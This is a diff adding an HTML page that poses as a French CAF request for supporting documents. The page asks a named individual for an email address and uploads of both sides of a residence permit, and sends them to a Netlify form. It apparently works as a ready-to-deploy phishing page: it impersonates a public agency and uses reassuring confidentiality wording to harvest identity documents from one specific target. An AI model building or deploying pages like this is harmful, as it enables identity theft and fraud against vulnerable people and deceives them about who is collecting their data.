@@ -1,0 +1,416 @@
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CAF|Demande de pièce justificative — Titre de séjour</title>
+<style>
+  :root {
+    --ink: #1f2b24;
+    --ink-soft: #4a5750;
+    --paper: #f7f6f1;
+    --card: #ffffff;
+    --sage: #2563EB;
+--sage-deep: #1D4ED8;
+    --line: #d9d5c9;
+    --warn-bg: #fbf3e3;
+    --warn-line: #e0c98f;
+    --error: #a3372c;
+    --radius: 10px;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    font-family: "Iowan Old Style", "Palatino Linotype", Georgia, serif;
+    background: var(--paper);
+    color: var(--ink);
+    line-height: 1.55;
+  }
+
+  .wrap {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 0 20px 80px;
+  }
+
+  header.hero {
+  position: relative;
+  background-image: url('/images/logoc.JPG');
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+  color: #fff;
+  padding: 56px 20px 40px;
+  margin-bottom: -28px;
+  overflow: hidden;
+}
+header.hero::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: rgba(29, 78, 216, 0.72);
+  z-index: 0;
+}
+
+  header.hero .hero-inner {
+  position: relative;
+  z-index: 1;
+  max-width: 720px;
+  margin: 0 auto;
+}
+
+  .eyebrow {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.14em;
+    font-size: 12px;
+    color: #b9cdbd;
+    margin: 0 0 14px;
+  }
+
+  header.hero h1 {
+    font-size: clamp(24px, 5vw, 34px);
+    line-height: 1.2;
+    margin: 0 0 16px;
+    font-weight: 600;
+  }
+
+  header.hero p {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    color: #d8ddd3;
+    font-size: 15px;
+    max-width: 54ch;
+    margin: 0;
+  }
+
+  main {
+    background: var(--card);
+    border-radius: var(--radius);
+    box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 12px 32px rgba(30,40,30,0.08);
+    padding: 8px 28px 40px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .notice {
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    background: var(--warn-bg);
+    border: 1px solid var(--warn-line);
+    border-radius: 8px;
+    padding: 16px 18px;
+    margin: 28px 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 14.5px;
+    color: #5c4a1f;
+  }
+
+  .notice.confidential {
+    background: #eef2ea;
+    border-color: #c8d4c0;
+    color: var(--sage-deep);
+  }
+
+  .notice strong { display: block; margin-bottom: 3px; }
+
+  .doc-request {
+    background: #f4f1ea;
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 20px 20px 16px;
+    margin-bottom: 28px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 14.5px;
+    color: var(--ink);
+    line-height: 1.6;
+  }
+
+  .doc-request strong {
+    display: block;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--sage);
+    margin-bottom: 8px;
+  }
+
+  .doc-request .already-provided {
+    font-size: 13px;
+    color: var(--ink-soft);
+    margin-top: 6px;
+    font-style: italic;
+  }
+
+  .step-label {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 12.5px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--sage);
+    font-weight: 700;
+    margin: 0 0 6px;
+    display: block;
+  }
+
+  h2 {
+    font-size: 22px;
+    margin: 0 0 18px;
+    font-weight: 600;
+    color: var(--ink);
+  }
+
+  .section-intro {
+    margin-top: 32px;
+    padding-top: 24px;
+    border-top: 1px solid var(--line);
+  }
+
+  .field {
+    margin-bottom: 22px;
+  }
+
+  label {
+    display: block;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-weight: 600;
+    font-size: 15px;
+    margin-bottom: 7px;
+    color: var(--ink);
+  }
+
+  label .req { color: var(--error); font-weight: 400; margin-left: 2px; }
+
+  input[type="text"],
+  input[type="email"] {
+    width: 100%;
+    padding: 12px 14px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 15.5px;
+    border: 1px solid #c7c2b3;
+    border-radius: 8px;
+    background: #fffefb;
+    color: var(--ink);
+    outline: none;
+    transition: border-color 0.15s ease, box-shadow 0.15s ease;
+  }
+
+  input:focus {
+    border-color: var(--sage);
+    box-shadow: 0 0 0 3px rgba(60,90,72,0.15);
+  }
+
+  .file-zone {
+    border: 1.5px dashed #b8b2a0;
+    border-radius: 8px;
+    padding: 28px 16px;
+    text-align: center;
+    background: #fbfaf6;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    transition: border-color 0.15s ease;
+  }
+
+  .file-zone:hover { border-color: var(--sage); }
+
+  .file-zone .upload-icon {
+    font-size: 28px;
+    margin-bottom: 8px;
+    display: block;
+  }
+
+  .file-zone .upload-hint {
+    font-size: 13.5px;
+    color: var(--ink-soft);
+    margin-bottom: 12px;
+  }
+
+  .file-zone input[type="file"] {
+    display: block;
+    margin: 0 auto;
+    font-size: 14px;
+    max-width: 100%;
+  }
+
+  .error-msg {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 13.5px;
+    color: var(--error);
+    margin-top: 10px;
+    margin-bottom: 20px;
+    display: none;
+  }
+
+  .error-msg.show { display: block; }
+
+  button[type="submit"] {
+    width: 100%;
+    background: var(--sage-deep);
+    color: #fff;
+    border: none;
+    padding: 16px;
+    border-radius: 8px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 16.5px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 28px;
+    transition: background 0.15s ease;
+  }
+
+  button[type="submit"]:hover { background: var(--sage); }
+  button[type="submit"]:disabled { opacity: 0.65; cursor: not-allowed; }
+
+  footer {
+    text-align: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 12.5px;
+    color: var(--ink-soft);
+    margin-top: 30px;
+  }
+
+  @media (max-width: 480px) {
+    main { padding: 4px 18px 32px; }
+    header.hero { padding: 44px 16px 36px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="hero-inner">
+    <p class="eyebrow">Pièce justificative requise</p>
+
+    <h1>Votre compte a besoin d'un document complémentaire</h1>
+
+    <p>
+      Veuillez transmettre les documents demandés ci-dessous afin de compléter votre dossier.
+    </p>
+  </div>
+</header>
+
+<div class="wrap">
+  <main>
+
+    <div class="notice confidential">
+      <span>🔒</span>
+      <div>
+        <strong>Vos informations sont traitées de manière confidentielle.</strong>
+        Les documents transmis sont utilisés uniquement dans le cadre de votre dossier d'accompagnement.
+      </div>
+    </div>
+
+    <div class="doc-request">
+      <strong>📋 Demande en cours</strong>
+      Votre compte a besoin de l'information ou de la pièce justificative suivante : la copie du recto et du verso du <strong>titre de séjour en cours de validité</strong> pour <strong>MEETA BAGWANDIN</strong>.
+      <p class="already-provided">Si ce document a déjà été fourni, veuillez ne pas prendre en compte cette demande.</p>
+    </div>
+
+    <form name="titre-sejour-meeta" method="POST" data-netlify="true" enctype="multipart/form-data" id="mainForm">
+      <input type="hidden" name="form-name" value="titre-sejour-meeta">
+
+      <!-- Identification -->
+      <div class="field">
+        <label for="email">Votre adresse e-mail<span class="req">*</span></label>
+        <input type="email" id="email" name="email" placeholder="Pour confirmation de réception" required>
+      </div>
+
+      <!-- Documents -->
+      <div class="section-intro">
+        <span class="step-label">Documents à transmettre</span>
+        <h2>Titre de séjour — MEETA BAGWANDIN</h2>
+      </div>
+
+      <div class="field">
+        <label for="titre_sejour_face1">
+          1 — Titre de séjour (face recto)<span class="req">*</span>
+        </label>
+        <div class="file-zone">
+          <span class="upload-icon">📄</span>
+          <p class="upload-hint">Photo ou scan lisible du recto du titre de séjour</p>
+          <input type="file" id="titre_sejour_face1" name="titre_sejour_face1" accept="image/*,.pdf" required>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="titre_sejour_face2">
+          2 — Titre de séjour (face verso)<span class="req">*</span>
+        </label>
+        <div class="file-zone">
+          <span class="upload-icon">📄</span>
+          <p class="upload-hint">Photo ou scan lisible du verso du titre de séjour</p>
+          <input type="file" id="titre_sejour_face2" name="titre_sejour_face2" accept="image/*,.pdf" required>
+        </div>
+      </div>
+
+      <p class="error-msg" id="formError">Merci de renseigner votre adresse e-mail et de joindre les deux faces du titre de séjour avant d'envoyer.</p>
+
+      <button type="submit" id="submitBtn">Envoyer les documents →</button>
+    </form>
+
+    <div id="successScreen" style="display:none; text-align:center; padding: 40px 10px 10px;">
+      <div style="font-size:48px; margin-bottom:14px;">✅</div>
+      <h2 style="margin:0 0 12px;">Documents reçus</h2>
+      <p style="font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; color:var(--ink-soft); font-size:15px; max-width:44ch; margin:0 auto;">
+        Merci. Vos documents ont bien été transmis. Votre dossier sera traité dans les meilleurs délais.
+      </p>
+    </div>
+
+    <p id="submitError" class="error-msg" style="text-align:center; margin-top:20px;">
+      Une erreur est survenue lors de l'envoi. Merci de réessayer, ou de nous contacter directement si le problème persiste.
+    </p>
+
+  
+
+  </main>
+</div>
+
+<script>
+  const mainForm = document.getElementById('mainForm');
+  const successScreen = document.getElementById('successScreen');
+  const submitError = document.getElementById('submitError');
+  const formError = document.getElementById('formError');
+  const submitBtn = document.getElementById('submitBtn');
+
+  mainForm.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value.trim();
+    const face1 = document.getElementById('titre_sejour_face1').files.length > 0;
+    const face2 = document.getElementById('titre_sejour_face2').files.length > 0;
+
+    if (!email || !face1 || !face2) {
+      formError.classList.add('show');
+      return;
+    }
+
+    formError.classList.remove('show');
+    submitError.classList.remove('show');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Envoi en cours…';
+
+    const formData = new FormData(mainForm);
+
+    fetch('/', {
+      method: 'POST',
+      body: formData
+    })
+      .then((response) => {
+        if (response.ok) {
+          mainForm.style.display = 'none';
+          successScreen.style.display = 'block';
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        } else {
+          throw new Error('Échec');
+        }
+      })
+      .catch(() => {
+        submitError.classList.add('show');
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Envoyer les documents →';
+      });
+  });
+</script>
+
+</body>
+</html>
